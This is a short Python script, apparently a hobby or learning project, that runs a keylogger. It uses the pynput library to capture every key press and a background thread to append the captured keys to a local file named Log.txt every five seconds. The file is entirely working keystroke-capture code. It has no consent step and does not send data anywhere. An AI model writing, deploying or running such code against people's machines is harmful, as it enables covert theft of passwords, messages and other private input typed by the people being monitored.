from pynput import keyboard
import threading
import time

dataVal = []

def main():
    # Spawning the thread to write to the log file every 5 seconds.
    writeThread = threading.Thread(target=fileWriter)
    writeThread.start()
    with keyboard.Listener(on_press=record) as listener:
        listener.join()


def record(key):
    global dataVal
    dataVal.append(str(key))
    # print(f"record {dataVal}")

def fileWriter():
    while True:
        global dataVal
        # print(f"the data val at the start {dataVal}")
        dataCopy = dataVal.copy()
        dataVal = dataVal[len(dataCopy):]
        # print(dataVal)
        # print(f"the copy {dataCopy}")
        with open('Log.txt', 'a') as f:
            for line in dataCopy:
                # print(f"wrote {line}")
                f.write(f"{line}\n")
        
        # The pause timer
        time.sleep(5)

if __name__=="__main__":
    main()